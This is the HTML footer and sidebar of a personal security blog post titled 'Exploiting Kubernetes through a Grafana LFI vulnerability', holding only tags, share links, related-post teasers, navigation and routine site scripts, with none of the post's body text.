no-text-decoration" >Cloud-Security</a> <a href="/tags/kubernetes/" class="post-tag no-text-decoration" >Kubernetes</a> <a href="/tags/docker/" class="post-tag no-text-decoration" >Docker</a> <a href="/tags/cve-2021-43798/" class="post-tag no-text-decoration" >CVE-2021-43798</a> <a href="/tags/grafana/" class="post-tag no-text-decoration" >Grafana</a> <a href="/tags/lfi/" class="post-tag no-text-decoration" >LFI</a> <a href="/tags/vulnerability/" class="post-tag no-text-decoration" >vulnerability</a> <a href="/tags/cloud-native/" class="post-tag no-text-decoration" >Cloud-Native</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Exploiting Kubernetes through a Grafana LFI vulnerability 👨‍🔬🔎💉 - (B)rootware Research&url=https://brootware.github.io/posts/exploiting-kubernetes-through-a-grafana-lfi-vulnerability/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Exploiting Kubernetes through a Grafana LFI vulnerability 👨‍🔬🔎💉 - (B)rootware Research&u=https://brootware.github.io/posts/exploiting-kubernetes-through-a-grafana-lfi-vulnerability/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://brootware.github.io/posts/exploiting-kubernetes-through-a-grafana-lfi-vulnerability/&text=Exploiting Kubernetes through a Grafana LFI vulnerability 👨‍🔬🔎💉 - (B)rootware Research" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://brootware.github.io/posts/exploiting-kubernetes-through-a-grafana-lfi-vulnerability/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recent Update</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/sensitive-data-redaction-pyredactkit/">Sensitive data redaction/unredaction tool - PyRedactKit 🧰🔐📝</a><li><a href="/posts/regex-performance-in-golang-and-rust-which-is-faster/">Regex performance in golang and rust. Which is faster? 🤔</a><li><a href="/posts/cyber-security-education/">Cyber Security Education 🔐 🕵️ 🎓</a><li><a href="/posts/cyber-league-ctf-2022-writeups/">Cyber League CTF 2022 - Writeups 🚩</a><li><a href="/posts/grepping-for-gold-in-JSON-APIs-with-jq/">Grepping for gold in JSON APIs with jq 🔍 📄</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/projects/">Projects</a> <a class="post-tag" href="/tags/blue-team/">Blue-team</a> <a class="post-tag" href="/tags/dfir/">DFIR</a> <a class="post-tag" href="/tags/forensics/">Forensics</a> <a class="post-tag" href="/tags/picoctf-2022/">picoctf-2022</a> <a class="post-tag" href="/tags/security-toolkit/">security-toolkit</a> <a class="post-tag" href="/tags/automation/">Automation</a> <a class="post-tag" href="/tags/devops/">DevOps</a> <a class="post-tag" href="/tags/general-tech/">General-tech</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/aws-bucket-security/"><div class="card-body"> <em class="timeago small" date="2022-02-05 17:16:00 +0800" >Feb 5, 2022</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>AWS Bucket - Cloud Security ☁️ 🪣 🔐</h3><div class="text-muted small"><p> Point: 600 Category Cloud Security, Blue team, Incident Response Challenge Details Welcome, Defender! As an incident responder, we’re granting you access to the AWS account called “Security” ...</p></div></div></a></div><div class="card"> <a href="/posts/creating-a-malware-analysis-lab-in-the-cloud/"><div class="card-body"> <em class="timeago small" date="2022-02-21 21:16:00 +0800" >Feb 21, 2022</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Creating a malware analysis lab in the cloud ☁️ 🔬</h3><div class="text-muted small"><p> Introduction This is the continuation of part 1: creating a malware analysis lab locally. To recap in part 1 we setup a flare vm by mandiant and create an image as a vagrant box to be uploaded to ...</p></div></div></a></div><div class="card"> <a href="/posts/cyber-security-education/"><div class="card-body"> <em class="timeago small" date="2022-03-31 18:41:00 +0800" >Mar 31, 2022</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Cyber Security Education 🔐 🕵️ 🎓</h3><div class="text-muted small"><p> Because Education should be free. What is this? Cyber Security University is a curated list of free educational resources that focuses on learn by doing. There are 6 parts to this. Introduc...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/creating-a-malware-analysis-lab-in-the-cloud/" class="btn btn-outline-primary" prompt="Older"><p>Creating a malware analysis lab in the cloud ☁️ 🔬</p></a> <a href="/posts/privacy-is-sexy/" class="btn btn-outline-primary" prompt="Newer"><p>Privacy is sexy 🍑🍆</p></a></div><script src="https://utteranc.es/client.js" repo="brootware/brootware.github.io" issue-term="url" crossorigin="anonymous" async> </script> <script type="text/javascript"> $(function() { const origin = "https://utteranc.es"; const iframe = "iframe.utterances-frame"; const lightTheme = "github-light"; const darkTheme = "github-dark"; let initTheme = lightTheme; if ($("html[mode=dark]").length > 0 || ($("html[mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches)) { initTheme = darkTheme; } addEventListener("message", (event) => { let theme; /* credit to <https://github.com/utterance/utterances/issues/170#issuecomment-594036347> */ if (event.origin === origin) { /* page initial */ theme = initTheme; } else if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { /* global theme mode changed */ const mode = event.data.message; theme = (mode === ModeToggle.DARK_MODE ? darkTheme : lightTheme); } else { return; } const message = { type: "set-theme", theme: theme }; const utterances = document.querySelector(iframe).contentWindow; utterances.postMessage(message, origin); }); }); </script></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://github.com/brootware">Oaker Min (Bruce)</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/projects/">Projects</a> <a class="post-tag" href="/tags/blue-team/">Blue-team</a> <a class="post-tag" href="/tags/dfir/">DFIR</a> <a class="post-tag" href="/tags/forensics/">Forensics</a> <a class="post-tag" href="/tags/picoctf-2022/">picoctf-2022</a> <a class="post-tag" href="/tags/security-toolkit/">security-toolkit</a> <a class="post-tag" href="/tags/automation/">Automation</a> <a class="post-tag" href="/tags/devops/">DevOps</a> <a class="post-tag" href="/tags/general-tech/">General-tech</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-E65Q2J8381"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-E65Q2J8381'); }); </script>
